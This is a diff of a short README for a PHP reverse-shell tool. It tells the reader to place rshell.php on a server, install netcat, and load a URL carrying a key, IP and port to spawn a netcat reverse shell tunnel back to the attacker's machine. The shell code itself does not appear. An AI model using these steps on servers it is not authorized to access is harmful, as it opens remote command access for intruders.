@@ -1,7 +1,6 @@
-php-reverse-shell
-=================
+php reverse shell
 
-Generates an encrypted reverse shell implementation in PHP 
+creates a reverse php shell...
 
 
 install:
@@ -9,7 +8,7 @@ copy rshell.php to your server
 
 run
 
-http://localhost/rshell/rshell.php
+http://localhost/reshell/rshell.php
 
 
 
@@ -29,14 +28,18 @@ http://internap.dl.sourceforge.net/sourceforge/netcat/netcat-0.7.1.tar.gz
 
 
 
-then query a connect...
+then connect...
 
 http://localhost/rshell/SHELLNAME.php?key=KEY&ip=YOURIP&port=PORT
 
 after the tunnel is created and the shell deamon is spawned close the browser window.
 
+you will be left with a netcat shell reverse tunnel from the server to your machine
+
 thats pretty much it...
 
+
+- brad
 
 
 
